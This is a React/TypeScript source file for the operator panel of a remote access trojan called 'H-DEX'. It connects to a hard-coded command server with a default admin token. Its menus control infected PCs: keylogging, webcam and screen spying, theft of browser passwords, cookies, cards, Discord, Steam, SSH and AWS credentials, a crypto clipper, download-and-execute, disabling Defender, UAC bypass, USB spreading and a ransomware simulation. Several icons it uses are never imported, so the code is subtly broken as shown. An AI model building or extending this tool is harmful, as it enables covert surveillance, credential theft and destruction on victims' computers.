import React, { useState, useEffect, useCallback, useRef } from 'react';
import {
  Monitor, Terminal, ShieldCheck, Eye, Lock,
  RefreshCcw, MessageSquare, Info, Camera,
  Activity, Clipboard, Power, Settings, Wifi, List, Mic, Trash2,
  Keyboard, ShieldX, HardDrive, Download, Upload, Search, Folder,
  File, Image, Globe, User,
  Cpu, Clock, Battery, WifiOff, Volume2, Sun, AlertTriangle,
  Skull, Rabbit, DollarSign, Gamepad2,
  Bookmark, Cookie, Home,
  X, Maximize2, Minimize2, Disc, VolumeX, ExternalLink,
  MousePointer2, PanelRight, PanelBottom, Grid3X3, List as ListIcon,
  ArrowUp, ArrowDown, RotateCcw, Ban, Check, AlertCircle,
  Shield, Zap, Radio, MapPin,
  Server, Play, Square, EyeOff, Database, KeyRound
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';

// --- TYPES ---
interface PCNode {
  id: string; name: string; ip: string; os: string;
  status: string; last_seen: string; tag?: string; is_active: number;
}

interface LogEntry {
  id: string; text: string;
  type: 'info' | 'error' | 'success' | 'cmd' | 'result' | 'event' | 'debug';
  time: string; data?: any;
}

interface FileItem {
  name: string; path: string; is_dir: boolean;
  size?: number; modified?: string;
}

interface ProcessInfo {
  pid: number; name: string; username: string;
}

// --- WINDOWS-STYLE FILE ICONS (SVG components) ---
const FolderIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M6 12a2 2 0 0 1 2-2h12l4 4h16a2 2 0 0 1 2 2v22a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V12z" fill="#f1c40f"/><path d="M6 14a2 2 0 0 1 2-2h16l4 4h12a2 2 0 0 1 2 2v6H6v-10z" fill="#f7dc6f" opacity="0.6"/></svg>;
const FileIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#e0e0e0"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#c0c0c0"/></svg>;
const ImageIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#3498db"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#2980b9"/><circle cx="18" cy="22" r="4" fill="#fff" opacity="0.8"/><path d="M10 38l8-10 6 8 4-6 8 10v2H10v-4z" fill="#fff" opacity="0.6"/></svg>;
const VideoIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#9b59b6"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#8e44ad"/><polygon points="20,20 20,32 32,26" fill="#fff" opacity="0.8"/></svg>;
const MusicIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#2ecc71"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#27ae60"/><circle cx="20" cy="32" r="4" fill="#fff" opacity="0.8"/><path d="M24 28l8-2v8" stroke="#fff" strokeWidth="2" fill="none" opacity="0.8"/></svg>;
const ArchiveIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#e67e22"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#d35400"/><rect x="18" y="22" width="12" height="14" rx="2" fill="#fff" opacity="0.3"/><line x1="20" y1="26" x2="28" y2="26" stroke="#fff" strokeWidth="1.5" opacity="0.6"/><line x1="20" y1="30" x2="28" y2="30" stroke="#fff" strokeWidth="1.5" opacity="0.6"/></svg>;
const ExeIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#e74c3c"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#c0392b"/><text x="24" y="32" textAnchor="middle" fill="#fff" fontSize="10" fontWeight="bold" fontFamily="monospace">EXE</text></svg>;
const CodeIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#1abc9c"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#16a085"/><text x="24" y="32" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="bold" fontFamily="monospace">&lt;/&gt;</text></svg>;
const TextIcon = (props: any) => <svg {...props} viewBox="0 0 48 48" fill="none"><path d="M10 4a2 2 0 0 0-2 2v36a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2V16L30 4H10z" fill="#95a5a6"/><path d="M30 4v10a2 2 0 0 0 2 2h10L30 4z" fill="#7f8c8d"/><line x1="16" y1="22" x2="32" y2="22" stroke="#fff" strokeWidth="1.5" opacity="0.6"/><line x1="16" y1="28" x2="28" y2="28" stroke="#fff" strokeWidth="1.5" opacity="0.6"/><line x1="16" y1="34" x2="30" y2="34" stroke="#fff" strokeWidth="1.5" opacity="0.6"/></svg>;

const fileIcon = (name: string, isDir: boolean) => {
  if (isDir) return FolderIcon;
  const ext = name.split('.').pop()?.toLowerCase();
  if (['jpg','jpeg','png','gif','bmp','webp','ico'].includes(ext || '')) return ImageIcon;
  if (['mp4','avi','mkv','mov','wmv','flv'].includes(ext || '')) return VideoIcon;
  if (['mp3','wav','flac','aac','ogg','wma'].includes(ext || '')) return MusicIcon;
  if (['zip','rar','7z','tar','gz'].includes(ext || '')) return ArchiveIcon;
  if (['exe','dll','msi','bat','ps1','vbs'].includes(ext || '')) return ExeIcon;
  if (['js','ts','py','java','cpp','c','h','rs','go','css','html','jsx','tsx'].includes(ext || '')) return CodeIcon;
  if (['txt','md','json','xml','csv','log','yaml','yml','ini','cfg','conf'].includes(ext || '')) return TextIcon;
  return FileIcon;
};

const HDexPage: React.FC = () => {
  const [nodes, setNodes] = useState<PCNode[]>([]);
  const [selectedNode, setSelectedNode] = useState<PCNode | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [lastSct, setLastSct] = useState<string | null>(null);
  const [lastCam, setLastCam] = useState<string | null>(null);
  const [processes, setProcesses] = useState<ProcessInfo[]>([]);
  const [wsConnected, setWsConnected] = useState(false);
  const [keylogData, setKeylogData] = useState<string>('');
  const [activeModule, setActiveModule] = useState('DASHBOARD');
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [showLogs, setShowLogs] = useState(true);

  // Input Modal
  const [inputModal, setInputModal] = useState<{ open: boolean; command: string; label: string; placeholder: string } | null>(null);
  const [mediaModal, setMediaModal] = useState(false);
  const [mediaUrl, setMediaUrl] = useState('');
  const [mediaType, setMediaType] = useState<'image' | 'video' | 'audio'>('image');
  const [mediaDuration, setMediaDuration] = useState(10);
  const [mediaScale, setMediaScale] = useState(100);
  const [mediaVolume, setMediaVolume] = useState(100);
  const [mediaLoop, setMediaLoop] = useState(false);
  const [mediaFullscreen, setMediaFullscreen] = useState(true);
  const [inputValue, setInputValue] = useState('');

  // File Manager State
  const [fmPath, setFmPath] = useState('C:\\');
  const [fmItems, setFmItems] = useState<FileItem[]>([]);
  const [fmDrives, setFmDrives] = useState<any[]>([]);
  const [fmView, setFmView] = useState<'grid' | 'list'>('grid');
  const [fmSearch, setFmSearch] = useState('');
  const [fmMode, setFmMode] = useState<'server' | 'client'>('server');  // server=HF files, client=target PC files
  const [clientFmPath, setClientFmPath] = useState('C:\\');
  const [clientFmItems, setClientFmItems] = useState<FileItem[]>([]);

  // Settings
  const [showSettings, setShowSettings] = useState(false);
  const [hdexUrl, setHdexUrl] = useState(localStorage.getItem('hdex_url') || import.meta.env.VITE_HDEX_URL || 'https://talhasss-hdex-ultra-server.hf.space');
  const [hdexToken, setHdexToken] = useState(localStorage.getItem('hdex_token') || import.meta.env.VITE_HDEX_TOKEN || 'hdex_admin_2026');

  const accentColor = '#00f0ff';
  const dangerColor = '#ff0040';
  const successColor = '#00ff88';
  const wsRef = useRef<WebSocket | null>(null);
  const logsEndRef = useRef<HTMLDivElement>(null);

  const addLog = useCallback((text: string, type: LogEntry['type'] = 'info', data?: any) => {
    setLogs(prev => [{ id: Math.random().toString(36).substr(2, 9), text, type, time: new Date().toLocaleTimeString([], { hour12: false }), data }, ...prev].slice(0, 200));
  }, []);

  const connectWS = useCallback(() => {
    if (wsRef.current) { wsRef.current.onclose = null; wsRef.current.close(); }
    const wsHost = hdexUrl.replace('https://', 'wss://').replace('http://', 'ws://');
    const ws = new WebSocket(`${wsHost}/ws`);
    wsRef.current = ws;
    ws.onopen = () => ws.send(JSON.stringify({ type: 'register_dashboard', token: hdexToken }));
    ws.onmessage = (event) => {
      try {
        const d = JSON.parse(event.data);
        switch (d.type) {
          case 'auth_success': setWsConnected(true); addLog('UPLINK ESTABLISHED', 'success'); break;
          case 'device_list': setNodes(d.devices || []); break;
          case 'screen_frame': setLastSct(`data:image/png;base64,${d.data}`); addLog('SCREEN FRAME RECEIVED', 'event'); break;
          case 'webcam_frame': setLastCam(`data:image/jpeg;base64,${d.data}`); break;
          case 'process_list': setProcesses(d.processes || []); addLog(`PROCESSES: ${d.processes?.length || 0}`, 'event'); break;
          case 'command_output': addLog(d.output, 'result', d); break;
          case 'clipboard_content': {
            const txt = d.data || d.content || '';
            addLog(`CLIPBOARD: ${txt.slice(0, 200)}`, 'result');
            break;
          }
          case 'live_keylog': setKeylogData(prev => prev + (d.key || '')); break;
          case 'keylog_dump': setKeylogData(d.logs?.map((l: any) => l.key || l[1] || '').join('') || ''); addLog('KEYLOG DUMP RECEIVED', 'event'); break;
          case 'keylog_history': setKeylogData(d.logs?.map((l: any) => typeof l === 'string' ? l : (l.key || l[1] || '')).join('\n') || d.message || 'No data'); addLog('KEYLOG HISTORY LOADED', 'event'); break;
          case 'dir_list': setClientFmItems(d.items?.map((i: any) => ({ ...i, path: i.path || `${clientFmPath}\\${i.name}` })) || []); break;
          case 'sys_info': addLog(`SYS INFO: ${JSON.stringify(d.data).slice(0, 300)}`, 'result'); break;
          case 'battery_status': addLog(`BATTERY: ${JSON.stringify(d.data)}`, 'result'); break;
          case 'network_info': addLog(`NETWORK: ${JSON.stringify(d.data).slice(0, 200)}`, 'result'); break;
          default: if (d.type !== 'heartbeat') addLog(`${d.type}: ${JSON.stringify(d).slice(0, 100)}`, 'event');
        }
      } catch (err) { console.error('WS Error:', err); }
    };
    ws.onclose = () => { setWsConnected(false); addLog('UPLINK LOST', 'error'); };
    ws.onerror = () => addLog('UPLINK ERROR', 'error');
  }, [hdexUrl, hdexToken, addLog]);

  useEffect(() => {
    document.title = 'RealHackers HQ // H-DEX COMMAND CENTER';
    connectWS();
    const hb = setInterval(() => {
      if (wsRef.current?.readyState === WebSocket.OPEN) wsRef.current.send(JSON.stringify({ type: 'heartbeat' }));
    }, 20000);
    return () => { clearInterval(hb); wsRef.current?.close(); };
  }, [connectWS]);

  useEffect(() => { logsEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [logs]);

  // Auto-load drives when FILES tab activated
  useEffect(() => {
    if (activeModule === 'FILES') loadDrives();
  }, [activeModule]);

  const sendCommand = (type: string, data: any = {}) => {
    if (!selectedNode || !wsConnected || wsRef.current?.readyState !== WebSocket.OPEN) {
      toast.error('SELECT NODE + CHECK UPLINK'); return;
    }
    const cmd = { type, target_id: selectedNode.id, ...data };
    wsRef.current.send(JSON.stringify(cmd));
    addLog(`DISPATCH: ${type}`, 'cmd');
  };

  const fetchFM = async (endpoint: string) => {
    try {
      const res = await fetch(`${hdexUrl}${endpoint}`);
      return await res.json();
    } catch { toast.error('FM fetch failed'); return null; }
  };

  const loadDir = async (path: string) => {
    if (fmMode === 'server') {
      const data = await fetchFM(`/fm/list?path=${encodeURIComponent(path)}`);
      if (data?.items) {
        setFmItems(data.items);
        setFmPath(path);
      }
    } else {
      sendCommand('list_dir', { path });
      setClientFmPath(path);
    }
  };

  const loadDrives = async () => {
    if (fmMode === 'server') {
      const data = await fetchFM('/fm/drive');
      if (data?.drives) setFmDrives(data.drives);
    } else {
      sendCommand('get_drives');
    }
  };

  const submitCommandInput = () => {
    if (!inputModal) return;
    const { command } = inputModal;
    switch (command) {
      case 'execute_command': sendCommand('execute_command', { command: inputValue }); break;
      case 'show_message': sendCommand('show_message', { title: 'HQ_ALERT', message: inputValue, icon: 64 }); break;
      case 'open_url': sendCommand('open_url', { url: inputValue }); break;
      case 'set_volume': sendCommand('set_volume', { level: parseInt(inputValue) || 50 }); break;
      case 'set_brightness': sendCommand('set_brightness', { level: parseInt(inputValue) || 50 }); break;
      case 'speak': sendCommand('speak', { text: inputValue }); break;
    }
    setInputModal(null);
  };

  const filteredNodes = nodes.filter(n =>
    n.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
    n.name?.toLowerCase().includes(searchQuery.toLowerCase())
  );

  // ====== MODULES ======
  const modules: { id: string; label: string; icon: any }[] = [
    { id: 'DASHBOARD', label: 'DASHBOARD', icon: Monitor },
    { id: 'CONTROL', label: 'CONTROL', icon: Zap },
    { id: 'INTEL', label: 'INTEL', icon: Eye },
    { id: 'FILES', label: 'FILES', icon: HardDrive },
    { id: 'PROCESS', label: 'PROCESS', icon: List },
    { id: 'HARVEST', label: 'HARVEST', icon: DollarSign },
    { id: 'PRANKS', label: 'PRANKS', icon: Rabbit },
    { id: 'TERMINAL', label: 'TERMINAL', icon: Terminal },
    { id: 'DEFENSE', label: 'DEFENSE', icon: Shield },
    { id: 'MEDIA', label: 'MEDIA', icon: Volume2 },
    { id: 'DANGER', label: 'DANGER', icon: Skull },
  ];

  // ====== COMMAND GROUPS ======
  const controlGroups: { title: string; icon: any; color: string; cmds: { label: string; type: string; data?: any; icon: any; danger?: boolean; input?: { cmd: string; label: string; placeholder: string } }[] }[] = [
    { title: 'SYSTEM', icon: Server, color: accentColor, cmds: [
      { label: 'SYS INFO', type: 'get_sys_info', icon: Info },
      { label: 'UPTIME', type: 'get_uptime', icon: Clock },
      { label: 'RESOLUTION', type: 'get_res', icon: Maximize2 },
      { label: 'ENV VARS', type: 'get_env', icon: Terminal },
      { label: 'USERS', type: 'get_users', icon: User },
      { label: 'UAC STATUS', type: 'get_uac', icon: Shield },
      { label: 'DRIVES', type: 'get_drives', icon: HardDrive },
      { label: 'DRIVERS', type: 'get_drivers', icon: Cpu },
      { label: 'EVENTS', type: 'get_events', icon: Activity },
      { label: 'FOREGROUND', type: 'get_foreground', icon: Eye },
      { label: 'FIREWALL', type: 'get_firewall', icon: Shield },
      { label: 'BITLOCKER', type: 'get_bitlocker', icon: Lock },
      { label: 'CERTS', type: 'get_certs', icon: Shield },
      { label: 'ARP/DNS', type: 'get_arp_dns', icon: Globe },
      { label: 'NETSTAT', type: 'get_netstat', icon: Activity },
      { label: 'AV STATUS', type: 'get_av', icon: ShieldX },
      { label: 'TASKS', type: 'get_tasks', icon: List },
      { label: 'DEEP SOFTWARE', type: 'get_deep_software', icon: Settings },
      { label: 'SCREENSHOT', type: 'take_screenshot', icon: Camera },
      { label: 'SCREEN STREAM', type: 'start_screen_stream', icon: Monitor },
      { label: 'STOP SCREEN', type: 'stop_screen_stream', icon: Square },
    ]},
    { title: 'POWER', icon: Power, color: '#ff6b35', cmds: [
      { label: 'LOCK', type: 'lock_windows', icon: Lock, danger: true },
      { label: 'LOGOFF', type: 'power_action', data: { action: 'logoff' }, icon: X, danger: true },
      { label: 'SHUTDOWN', type: 'power_action', data: { action: 'shutdown' }, icon: Power, danger: true },
      { label: 'RESTART', type: 'power_action', data: { action: 'restart' }, icon: RefreshCcw, danger: true },
      { label: 'HIBERNATE', type: 'power_action', data: { action: 'hibernate' }, icon: Battery, danger: true },
      { label: 'SLEEP', type: 'power_action', data: { action: 'sleep' }, icon: Moon, danger: true },
      { label: 'MONITOR OFF', type: 'monitor_off', icon: EyeOff },
      { label: 'MONITOR ON', type: 'monitor_on', icon: Eye },
    ]},
    { title: 'INPUT', icon: MousePointer2, color: '#a855f7', cmds: [
      { label: 'BLOCK INPUT', type: 'block_input', icon: Ban, danger: true },
      { label: 'UNBLOCK INPUT', type: 'unblock_input', icon: Check },
      { label: 'BLOCK ENHANCED', type: 'block_input_enhanced', icon: Shield, danger: true },
      { label: 'UNBLOCK ENHANCED', type: 'unblock_input_enhanced', icon: ShieldX },
      { label: 'MOUSE MOVE', type: 'mouse_move', icon: MousePointer2 },
      { label: 'MOUSE CLICK', type: 'mouse_click', icon: MousePointer2 },
      { label: 'KEY PRESS', type: 'key_press', icon: Keyboard },
      { label: 'SWAP MOUSE BTN', type: 'swap_mouse', icon: ArrowUp, danger: true },
      { label: 'RESTORE MOUSE', type: 'restore_mouse', icon: ArrowDown },
    ]},
    { title: 'REMOTE', icon: Radio, color: '#22d3ee', cmds: [
      { label: 'SHELL', type: 'input', input: { cmd: 'execute_command', label: 'EXECUTE SHELL', placeholder: 'dir, whoami, ipconfig...' }, icon: Terminal },
      { label: 'MESSAGE', type: 'input', input: { cmd: 'show_message', label: 'SHOW ALERT', placeholder: 'Alert text...' }, icon: MessageSquare },
      { label: 'OPEN URL', type: 'input', input: { cmd: 'open_url', label: 'OPEN URL', placeholder: 'https://...' }, icon: ExternalLink },
      { label: 'SPAM URL', type: 'spam_url', icon: Globe, danger: true },
      { label: 'DOWNLOAD+EXEC', type: 'download_execute', icon: Download },
      { label: 'VISIT URL', type: 'visit_url', icon: ExternalLink },
      { label: 'SET WALLPAPER', type: 'set_wallpaper', icon: Image },
    ]},
    { title: 'NETWORK', icon: Wifi, color: '#34d399', cmds: [
      { label: 'WIFI PROFILES', type: 'get_wifi', icon: Wifi },
      { label: 'WIFI LIST', type: 'get_wifi_list', icon: Wifi },
      { label: 'NETWORK INFO', type: 'get_network', icon: Globe },
      { label: 'SCAN NETWORK', type: 'scan_network', icon: Radio },
      { label: 'BATTERY', type: 'get_battery', icon: Battery },
      { label: 'LOCATION', type: 'get_location', icon: MapPin },
      { label: 'SERVICES', type: 'get_services', icon: Server },
      { label: 'AUDIO DEVICES', type: 'get_audio_list', icon: Mic },
    ]},
    { title: 'CLIPBOARD', icon: Clipboard, color: '#f472b6', cmds: [
      { label: 'GET CLIPBOARD', type: 'get_clipboard', icon: Clipboard },
      { label: 'SET CLIPBOARD', type: 'set_clipboard', icon: Clipboard },
      { label: 'MONITOR CLIP', type: 'start_clipboard_monitor', icon: Activity },
      { label: 'STOP CLIP MON', type: 'stop_clipboard_monitor', icon: Square },
      { label: 'WINDOW TRACK', type: 'start_window_tracker', icon: Eye },
      { label: 'STOP WIN TRACK', type: 'stop_window_tracker', icon: EyeOff },
      { label: 'WINDOW LOG', type: 'get_window_log', icon: List },
    ]},
    { title: 'CRYPTO', icon: DollarSign, color: '#fbbf24', cmds: [
      { label: 'CLIPPER ON', type: 'start_crypto_clipper', icon: DollarSign },
      { label: 'CLIPPER OFF', type: 'stop_crypto_clipper', icon: Ban },
      { label: 'SCAN WALLETS', type: 'scan_wallets', icon: DollarSign },
    ]},
  ];

  const intelCmds = [
    { label: 'SCREENSHOT', type: 'take_screenshot', icon: Camera },
    { label: 'STREAM SCREEN', type: 'start_screen_stream', icon: Monitor },
    { label: 'STOP SCREEN', type: 'stop_screen_stream', icon: Square },
    { label: 'WEBCAM', type: 'start_webcam_stream', icon: Camera },
    { label: 'STOP WEBCAM', type: 'stop_webcam_stream', icon: Square },
    { label: 'KEYLOGGER ON', type: 'start_keylogger', icon: Keyboard },
    { label: 'KEYLOGGER OFF', type: 'stop_keylogger', icon: Keyboard },
    { label: 'DUMP KEYLOGS', type: 'dump_keylogs', icon: Download },
    { label: 'ALL KEYLOGS', type: 'get_all_keylogs', icon: List },
    { label: 'LIVE KEYLOG', type: 'start_live_keylog', icon: Radio },
    { label: 'STOP LIVE KEY', type: 'stop_live_keylog', icon: Square },
    { label: 'CLEAR KEYLOGS', type: 'clear_keylogs', icon: Trash2 },
    { label: 'SA-MP PASS', type: 'samp_passwords', icon: KeyRound },
    { label: 'GET KEYLOGS', type: 'get_keylogs', icon: Database },
  ];

  const harvestCmds: { label: string; type: string; icon: any; group: string }[] = [
    { label: 'BROWSER PASSWORDS', type: 'get_browser_passwords', icon: Lock, group: 'BROWSER' },
    { label: 'BROWSER COOKIES', type: 'get_browser_cookies', icon: Cookie, group: 'BROWSER' },
    { label: 'BROWSER HISTORY', type: 'get_browser_history', icon: Clock, group: 'BROWSER' },
    { label: 'BOOKMARKS', type: 'get_browser_bookmarks', icon: Bookmark, group: 'BROWSER' },
    { label: 'AUTOFILL', type: 'get_browser_autofill', icon: File, group: 'BROWSER' },
    { label: 'EXTENSIONS', type: 'get_browser_ext', icon: Puzzle, group: 'BROWSER' },
    { label: 'PAYMENT CARDS', type: 'get_browser_cards', icon: CreditCard, group: 'BROWSER' },
    { label: 'BROWSER PAYMENTS', type: 'get_browser_payments', icon: DollarSign, group: 'BROWSER' },
    { label: 'DISCORD TOKENS', type: 'get_discord_tokens', icon: MessageSquare, group: 'APPS' },
    { label: 'TELEGRAM', type: 'get_telegram', icon: Send, group: 'APPS' },
    { label: 'STEAM', type: 'get_steam', icon: Gamepad2, group: 'APPS' },
    { label: 'MINECRAFT', type: 'get_minecraft', icon: Pickaxe, group: 'APPS' },
    { label: 'FILEZILLA', type: 'get_filezilla', icon: Upload, group: 'APPS' },
    { label: 'WINSCP', type: 'get_winscp', icon: Upload, group: 'APPS' },
    { label: 'MOBAXTERM', type: 'get_mobaxterm', icon: Terminal, group: 'APPS' },
    { label: 'SSH KEYS', type: 'get_ssh_keys', icon: Key, group: 'APPS' },
    { label: 'AWS CREDS', type: 'get_aws_creds', icon: Cloud, group: 'APPS' },
    { label: 'EMAIL CREDS', type: 'get_email_creds', icon: Mail, group: 'APPS' },
    { label: 'VPN CONFIGS', type: 'get_vpn_configs', icon: Globe, group: 'APPS' },
    { label: 'RDP CREDS', type: 'get_saved_rdp', icon: Monitor, group: 'APPS' },
    { label: 'PRODUCT KEYS', type: 'get_product_keys', icon: Key, group: 'SYSTEM' },
    { label: 'INSTALLED SW', type: 'get_installed_software', icon: Settings, group: 'SYSTEM' },
    { label: 'SENSITIVE DOCS', type: 'find_docs', icon: File, group: 'SYSTEM' },
    { label: 'WIFI PASSWORDS', type: 'get_wifi', icon: Wifi, group: 'SYSTEM' },
  ];

  const prankCmds = [
    { label: 'FAKE UPDATE', type: 'fake_update', icon: Monitor, color: accentColor },
    { label: 'FAKE BSOD', type: 'fake_bsod', icon: AlertTriangle, color: '#3b82f6' },
    { label: 'BEEP LOOP', type: 'start_beep', icon: Volume2, color: '#f59e0b', danger: true },
    { label: 'STOP BEEP', type: 'stop_beep', icon: VolumeX, color: '#f59e0b' },
    { label: 'SPEAK', type: 'input', input: { cmd: 'speak', label: 'TTS SPEAK', placeholder: 'Text to speak...' }, icon: Mic, color: '#8b5cf6' },
    { label: 'SPAM MSG', type: 'spam_msg', icon: MessageSquare, color: '#ec4899', danger: true },
    { label: 'SPAM CALC', type: 'spam_calc', icon: Calculator, color: '#14b8a6', danger: true },
    { label: 'SPAM NOTEPAD', type: 'spam_notepad', icon: File, color: '#14b8a6', danger: true },
    { label: 'CRAZY MOUSE', type: 'crazy_mouse', icon: MousePointer2, color: '#f43f5e', danger: true },
    { label: 'HIDE ICONS', type: 'hide_icons', icon: EyeOff, color: '#64748b' },
    { label: 'SHOW ICONS', type: 'show_icons', icon: Eye, color: '#64748b' },
    { label: 'HIDE TASKBAR', type: 'hide_taskbar', icon: PanelBottom, color: '#64748b' },
    { label: 'SHOW TASKBAR', type: 'show_taskbar', icon: PanelBottom, color: '#64748b' },
    { label: 'SWAP MOUSE', type: 'swap_mouse', icon: ArrowUp, color: '#f43f5e', danger: true },
    { label: 'RESTORE MOUSE', type: 'restore_mouse', icon: ArrowDown, color: '#22c55e' },
    { label: 'ROTATE 90', type: 'rotate_90', icon: RotateCcw, color: '#a855f7', danger: true },
    { label: 'ROTATE 180', type: 'rotate_180', icon: ArrowDown, color: '#a855f7', danger: true },
    { label: 'ROTATE 270', type: 'rotate_270', icon: RotateCcw, color: '#a855f7', danger: true },
    { label: 'ROTATE 0', type: 'rotate_0', icon: RefreshCcw, color: '#22c55e' },
    { label: 'OPEN CD', type: 'open_cd', icon: Disc, color: '#f59e0b' },
    { label: 'MINIMIZE ALL', type: 'minimize_all', icon: Minimize2, color: '#64748b' },
    { label: 'HANG SYSTEM', type: 'hang_system', icon: AlertCircle, color: '#ef4444', danger: true },
    { label: 'MATRIX', type: 'ultra_matrix', icon: Terminal, color: '#22c55e', danger: true },
    { label: 'EMPTY RECYCLE', type: 'empty_recycle', icon: Trash2, color: '#ef4444', danger: true },
    { label: 'RANSOMWARE', type: 'prank_ransomware', icon: Skull, color: '#dc2626', danger: true },
    { label: 'INVERT COLORS', type: 'invert_colors', icon: Sun, color: '#a855f7' },
    { label: 'NARRATOR', type: 'toggle_narrator', icon: Volume2, color: '#f59e0b' },
    { label: 'SCREEN SHAKE', type: 'screen_shake', icon: Zap, color: '#f43f5e', danger: true },
    { label: 'FAKE VIRUS', type: 'fake_virus', icon: ShieldX, color: '#dc2626', danger: true },
    { label: 'SHOW MEDIA', type: 'show_media_btn', icon: Monitor, color: '#8b5cf6' },
  ];

  const defenseCmds = [
    { label: 'DISABLE DEFENDER', type: 'disable_defender', icon: Shield, danger: true },
    { label: 'ENABLE DEFENDER', type: 'enable_defender', icon: ShieldCheck },
    { label: 'DISABLE USB', type: 'disable_usb', icon: HardDrive, danger: true },
    { label: 'ENABLE USB', type: 'enable_usb', icon: HardDrive },
    { label: 'DISABLE WIFI', type: 'disable_wifi', icon: WifiOff, danger: true },
    { label: 'ENABLE WIFI', type: 'enable_wifi', icon: Wifi },
    { label: 'DISABLE CMD', type: 'disable_cmd', icon: Terminal, danger: true },
    { label: 'ENABLE CMD', type: 'enable_cmd', icon: Terminal },
    { label: 'DISABLE REGEDIT', type: 'disable_reg', icon: Settings, danger: true },
    { label: 'ENABLE REGEDIT', type: 'enable_reg', icon: Settings },
    { label: 'DISABLE TASKMGR', type: 'disable_taskmgr', icon: List, danger: true },
    { label: 'ENABLE TASKMGR', type: 'enable_taskmgr', icon: List },
    { label: 'DISABLE MOUSE', type: 'disable_mouse', icon: MousePointer2, danger: true },
    { label: 'ENABLE MOUSE', type: 'enable_mouse', icon: MousePointer2 },
    { label: 'DISABLE NET', type: 'disable_net', icon: Globe, danger: true },
    { label: 'ENABLE NET', type: 'enable_net', icon: Globe },
    { label: 'BLOCK ENHANCED', type: 'block_input_enhanced', icon: Ban, danger: true },
    { label: 'UNBLOCK ENHANCED', type: 'unblock_input_enhanced', icon: Check },
  ];

  const mediaCmds = [
    { label: 'SET VOLUME', type: 'input', input: { cmd: 'set_volume', label: 'SET VOLUME (0-100)', placeholder: '50' }, icon: Volume2 },
    { label: 'SET BRIGHTNESS', type: 'input', input: { cmd: 'set_brightness', label: 'SET BRIGHTNESS (0-100)', placeholder: '70' }, icon: Sun },
    { label: 'STREAM AUDIO', type: 'start_audio_stream', icon: Mic },
    { label: 'STOP AUDIO', type: 'stop_audio_stream', icon: Square },
    { label: 'PLAY AUDIO', type: 'play_audio', icon: Play },
    { label: 'AUDIO DEVICES', type: 'get_audio_list', icon: List },
  ];

  const dangerCmds = [
    { label: 'START DANGER', type: 'start_danger', icon: Skull, color: '#ef4444', danger: true },
    { label: 'STOP DANGER', type: 'stop_danger', icon: Check, color: '#22c55e' },
    { label: 'BSOD', type: 'bsod', icon: AlertTriangle, color: '#ef4444', danger: true },
    { label: 'SELF DESTRUCT', type: 'self_destruct', icon: Skull, color: '#ef4444', danger: true },
    { label: 'STOP CLIENT', type: 'stop_client', icon: Square, color: '#ef4444', danger: true },
    { label: 'RESTART CLIENT', type: 'restart_client', icon: RefreshCcw, color: '#f59e0b' },
    { label: 'NUKE RESTORE', type: 'nuke_restore', icon: Trash2, color: '#ef4444', danger: true },
    { label: 'SPREAD USB', type: 'spread_usb', icon: HardDrive, color: '#ef4444', danger: true },
    { label: 'RANSOM SIM', type: 'ransom_sim', icon: Lock, color: '#ef4444', danger: true },
    { label: 'UAC BYPASS', type: 'uac_bypass', icon: Shield, color: '#f59e0b' },
  ];

  const processCmds = [
    { label: 'GET PROCESSES', type: 'get_processes', icon: List },
    { label: 'REFRESH', type: 'get_processes', icon: RefreshCcw },
  ];

  const renderModuleButton = (cmd: any) => {
    const isInput = cmd.type === 'input';
    const handleClick = () => {
      if (cmd.type === 'show_media_btn') setMediaModal(true);
      else if (isInput) setInputModal({ open: true, ...cmd.input });
      else sendCommand(cmd.type, cmd.data || {});
    };
    return (
      <motion.button
        key={cmd.label}
        whileHover={{ scale: 1.03, y: -2 }}
        whileTap={{ scale: 0.97 }}
        onClick={handleClick}
        className="btn"
        style={{
          display: 'flex', alignItems: 'center', gap: '0.5rem',
          padding: '0.65rem 0.9rem', fontSize: '0.6rem',
          border: cmd.danger ? `1px solid ${dangerColor}44` : '1px solid rgba(255,255,255,0.06)',
          color: cmd.danger ? dangerColor : (cmd.color || '#fff'),
          background: cmd.danger ? `${dangerColor}08` : 'rgba(255,255,255,0.02)',
          fontFamily: 'monospace', fontWeight: '700', letterSpacing: '0.5px',
